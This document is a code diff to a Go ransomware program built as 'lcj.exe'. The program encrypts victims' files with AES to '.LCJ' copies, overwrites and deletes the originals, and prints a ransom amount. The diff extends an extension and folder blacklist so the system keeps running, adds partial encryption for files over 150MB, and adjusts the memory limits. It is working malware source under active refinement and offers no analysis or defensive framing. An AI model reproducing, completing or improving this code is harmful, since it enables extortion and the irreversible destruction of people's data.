@@ -57,6 +57,52 @@ var ext_blacklist = []string{
 	"img",
 	"xml",
 	"old", // lisandro : do i keep this ?
+	"386",
+	"adv",
+	"ani",
+	"bat",
+	"bin",
+	"cab",
+	"cmd",
+	"com",
+	"cpl",
+	"cur",
+	"deskthemepack",
+	"diagcab",
+	"diagcfg",
+	"diagpkg",
+	"drv",
+	"hlp",
+	"icl",
+	"icns",
+	"ico",
+	"ics",
+	"idx",
+	"ldf",
+	"lnk",
+	"mod",
+	"mpa",
+	"msc",
+	"msp",
+	"msstyles",
+	"nls",
+	"nomedia",
+	"ocx",
+	"prf",
+	"ps1",
+	"rom",
+	"rtp",
+	"scr",
+	"shs",
+	"spl",
+	"theme",
+	"themepack",
+	"wpx",
+	"lock",
+	"key",
+	"hta",
+	"pdb",
+
 }
 var WINDOWS_ff_blacklist = []string{
 	"bootmgr",
@@ -64,17 +110,15 @@ var WINDOWS_ff_blacklist = []string{
 	"Documents and Settings",
 	"DumpStack.log",
 	"DumpStack.log.tmp",
-	//"pagefiles.sys", edode : included in ext_whitelist
 	"Program Files",
 	"Program Files (x86)",
 	"ProgramData",
-	//"swapfile.sys", edode : included in ext_whitelist
 	"Windows",
 	"System Volume Information",
 	"lost+found",
 	"Autodesk",
 }
-var LINUX_ff_blacklist = []string{ // lisandro : evaluate symlink
+var LINUX_ff_blacklist = []string{
 	"bin",
 	"boot",
 	".cache",
@@ -130,7 +174,7 @@ func Error(err error) (error){
 
 // ========= SHRED =========
 
-func overwrite_remove(path string) (error) {
+func overwrite_remove(path string) (error) { // lisandro : do not encrypt file if it's above 950MB
 	f, err := os.OpenFile(path, os.O_WRONLY, 0)
 	if err != nil {
 		return err
@@ -144,8 +188,7 @@ func overwrite_remove(path string) (error) {
 
 	total_files_opened = total_files_opened + file_size
 
-	if total_files_opened >= 1073741824{
-		fmt.Println("Total files opened are above 1 GB ! : ", total_files_opened, "GB")
+	if total_files_opened >= 943718400{
 		wg.Wait()
 	}
 
@@ -249,6 +292,9 @@ func encryption_key() {
 }
 
 func encrypt_file(inputfile string, outputfile string) {
+	if inputfile == "/root/y/_libcef.so"{
+		fmt.Println("ez")
+	}
 	b, err := ioutil.ReadFile(inputfile) //Read the target file
 	Error(err)
 	ciphertext := encrypt(key, b)
@@ -266,21 +312,21 @@ func encodeBase64(b []byte) []byte {
 
 func encrypt(key, text []byte) []byte {
 	// lisandro : move the 4 lines below to be global ?
+
+	var above bool = false // edode : if file size is above 950 MB
+	var not_ciphered_text, ciphered_text []byte
 	block, err := aes.NewCipher(key)
+	ciphered_text = text
 	if err != nil {
 		panic(err)
 	}
-
-	var above bool = false
-	var not_ciphered_text []byte
-
 	if len(text) > MB150 { // edode : if the size of the file is superior to 150MB
-		text	     	  = text[:MB150]
+		ciphered_text 	  = text[:MB150]
 		not_ciphered_text = text[MB150:]
 		above = true
 	}
 
-	b := encodeBase64(text)
+	b := encodeBase64(ciphered_text)
 	ciphertext := make([]byte, aes.BlockSize+len(b))
 	iv := ciphertext[:aes.BlockSize]
 
@@ -292,11 +338,11 @@ func encrypt(key, text []byte) []byte {
 	cfb.XORKeyStream(ciphertext[aes.BlockSize:], b)
 
 	if above {
-		scrambled_text := make([]byte, len(text))
-		for _, bit := range(not_ciphered_text){
+		scrambled_text := make([]byte, len(ciphertext)+len(not_ciphered_text))
+		for _, bit := range(ciphertext){
 			scrambled_text = append(scrambled_text, bit)
 		}
-		for _, bit := range(text){
+		for _, bit := range(not_ciphered_text){
 			scrambled_text = append(scrambled_text, bit)
 		}
 		return scrambled_text;
@@ -546,10 +592,7 @@ func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 	encryption_key()
 
 	c := make(chan string, 100)
-	var m runtime.MemStats
-	runtime.ReadMemStats(&m)
 
-	fmt.Print(m.TotalAlloc)
 	for _, f := range(files){
 		if check_ext(f) || is_dir(f) || is_symlink(f){
 			continue
@@ -571,7 +614,7 @@ func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 		wg.Add(1)
 		go func (f string, c chan string) (){
 			defer wg.Done()
-			fmt.Println(total_files_opened)
+			//fmt.Println(total_files_opened)
 			encrypt_file(f, f+".LCJ")
 			err := overwrite_remove(f)
 			if err != nil{
@@ -582,14 +625,17 @@ func main() { // GOOS=windows GOARCH=amd64 go build -o lcj.exe encryptor.go
 	}
 	wg.Wait()
 
-	fmt.Println("light files encrypted")
+	//fmt.Println("light files encrypted")
 	for _, f := range(files){
+		if check_ext(f) || is_dir(f) || is_symlink(f){
+			continue
+		}
 		e := os.Remove(f)
 		if e!=nil {
 			continue
 		}
 	}
-	fmt.Println(ext, ransom_amount(ext))
+	fmt.Println("Files encrypted : ", ext, "Ransom amount : ", ransom_amount(ext))
 	log.Printf("SECOND ELAPSED : %s", time.Since(start))
 }
 
